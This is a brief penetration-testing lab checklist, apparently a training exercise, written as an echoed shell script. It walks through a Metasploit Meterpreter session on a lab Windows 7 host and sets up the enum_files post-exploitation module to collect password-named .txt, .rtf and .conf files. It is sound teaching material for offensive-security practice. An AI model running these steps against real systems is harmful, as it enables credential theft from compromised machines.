echo '
--] METERPRETER UPLOAD 43

OPERATOR   === KALI               IP === 132
TANGO      === WIN 7              IP === 134
LAB        === NET                ALL === 172.16.14.IP



OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> exploit -j
OPERATOR    ==> TASK ==> session -i 2
OPERATOR    ==> TASK ==> meterpreter
OPERATOR    ==> TASK ==> getuid
OPERATOR    ==> TASK ==> background
OPERATOR    ==> TASK ==> use post/windows/gather/enum_files
TANGO       ==> TASK ==> make Pass.txt
TANGO       ==> TASK ==> make Pass.rtf
TANGO       ==> TASK ==> make Pass.conf
TANGO       ==> TASK ==> make Pass.conf
OPERATOR    ==> TASK ==> show options 
OPERATOR    ==> TASK ==> set FILE_GLOBS *.conf OR *.rtf OR *.txt
OPERATOR    ==> TASK ==> set search_from C:\\users\\ptbox
OPERATOR    ==> TASK ==> set session 6
OPERATOR    ==> TASK ==> show options
OPERATOR    ==> TASK ==> 

'
read